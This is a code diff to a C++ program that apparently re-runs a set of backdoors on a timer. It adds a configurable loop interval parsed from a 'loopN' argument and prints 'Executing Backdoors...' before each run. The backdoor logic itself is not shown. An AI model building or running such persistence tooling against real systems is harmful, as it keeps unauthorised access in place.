@@ -5,8 +5,8 @@
 #include <string>
 #include <thread>
 #include <chrono>
-
 #include <iostream>
+#include <string.h>
 
 void gatekeeper_art() {
     std::cout << std::endl;
@@ -257,16 +257,23 @@ int main(int argc, char *argv[]){
     startup(); //runs basic startup (clear, ascii art, admin perms, hotkeys, cleanup)
 
     bool shouldLoop = false;
+    int loopDuration = 0;
     //parses through arguments to check for the loop parameter
-     for (int i = 1; i < argc; i++) {
-        if (std::string(argv[i]) == "loop" || std::string(argv[i]) == "Loop") {
+    for (int i = 1; i < argc; i++) {
+        if (strncmp(argv[i], "loop", 4) == 0) {
             shouldLoop = true;
-            //remove the "loop" argument by shifting the rest of the arguments
+            if (strlen(argv[i]) > 4) {
+                loopDuration = atoi(argv[i] + 4);
+            } else {
+                loopDuration = 5; //defaults to 5 minutes
+            }
+    
+            //removes the loop argument from the rest of parameters
             for (int j = i; j < argc - 1; j++) {
                 argv[j] = argv[j + 1];
             }
             argc--;
-            break; 
+            break;
         }
     }
 
@@ -280,8 +287,10 @@ int main(int argc, char *argv[]){
 
     //loops if loop parameter is present
     while (shouldLoop) {
-        std::cout << "\033[1;33mSleeping for 1 minute before re-running...\033[0m" << std::endl;
-        std::this_thread::sleep_for(std::chrono::minutes(1));
+        if (loopDuration > 0) {
+            std::cout << "\033[1;33mSleeping for " << loopDuration << " minute(s) before re-running backdoors...\033[0m" << std::endl;
+            std::this_thread::sleep_for(std::chrono::minutes(loopDuration));
+        }
         startup();
         std::cout << "Executing Backdoors..." << std::endl;
         execute_backdoors(argc, argv);
